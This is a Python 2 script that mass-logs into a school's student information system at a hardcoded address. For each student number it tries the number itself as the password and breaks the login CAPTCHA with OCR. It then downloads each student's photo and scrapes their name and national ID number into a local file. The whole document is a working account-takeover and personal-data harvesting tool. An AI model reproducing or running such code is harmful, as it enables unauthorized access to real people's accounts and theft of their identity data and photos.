
import requests
import HTMLParser  
import urlparse  
import urllib  
import urllib2  
import cookielib  
import string  
import re 
from pytesser import *
from PIL import ImageEnhance
from PIL import Image
import urllib
import StringIO
import os


#########################################################
traget_url = "http://210.29.96.239/loginAction.do"
index_url = "http://210.29.96.239/"
header = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36' }
#########################################################
if not os.path.exists(r".\image12"):
    os.makedirs(r".\image12")
class stu(object):
        """docstring for Students"""
        def __init__(self,NO):
            # super(Students, self).__init__()    
            s = requests.session()
            #get the index
            self.NO = NO
            PASSW = NO 
            index = s.get(index_url)
            #the first try to get the verificationcode
            ve_code = s.get("http://210.29.96.239/validateCodeAction.do")


            #data to post
            form_data = {'zjh':NO, 
                         'mm':PASSW,
                         'v_yzm':"6235"
                                        }

            #post data and headers to the server
            error_run = s.post(traget_url,data = form_data,headers = header)


            #get the identifying_code
            def getTheVecode():
                ve_code = s.get("http://210.29.96.239/validateCodeAction.do")
                ve_code_to_jpg = Image.open(StringIO.StringIO(ve_code.content))
                ve_code_to_jpg.save("import.jpg")

                #return the  ve_code from ocr
                im = Image.open("import.jpg")
                imgry = im.convert('L')
                threshold = 140  
                table = []  
                for i in range(256):  
                    if i < threshold:  
                        table.append(0)  
                    else:  
                        table.append(1) 

                out = imgry.point(table,'1')  
                text = image_to_string(out)
                a = text.split();
                text = "".join(a)
                return text

            idf_code = getTheVecode()
            while (len(idf_code) != 4):
                idf_code = getTheVecode()


            form_data['v_yzm'] = idf_code
            response = s.post(traget_url,data = form_data,headers = header)
            errorNum = 0 #count the error of login
            while ( response.text == error_run.text or response.text == index.text):
                errorNum += 1
                if errorNum == 5:
                    break
                    print NO + "connot login!"

                getTheVecode()
                form_data['v_yzm'] = idf_code
                response = s.post(traget_url,data = form_data,headers = header)

            
            def get_image():
                isdn = s.get("http://210.29.96.239/xjInfoAction.do?oper=img")
                isd_to_jpg = Image.open(StringIO.StringIO(isdn.content))
                isd_to_jpg.save(".\\image12\\"+NO + ".jpg")
            def get_name_and_id(): 
                info = s.get("http://210.29.96.239/xjInfoAction.do?oper=xjxx")
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(info.text, 'html.parser')
                info = soup.prettify()
                pattern = re.compile(ur"[\u4e00-\u9fa5]{2,4}")
                list1 = pattern.findall(info)
                f = open('test12.txt','a+')
                f.write(list1[7].encode("gbk")+" ")
                p = re.compile(r"[0-9]{17}[01234567890xX]")
                list1 = p.findall(info)
                f.write(list1[0].encode("gbk"))
                f.write("\n")
                f.close()
            if ("if(document.loginForm.zjh.value ==" in response.text) and errorNum != 5:
                print "password error"
            else:
                if errorNum != 5:
                    get_image()
                    get_name_and_id()
                    print NO + " done!"

def show():
    # no = raw_input("Enter the student number: ")
    # stu(no)
        f = open('12.txt', 'r') 
        for line in f.readlines():                         
            try:
                line = line.strip()                             
                if not len(line) or line.startswith('#'):         
                    continue                                    
                stu(line)
            except:
                pass
if __name__ == '__main__':
    show()
        

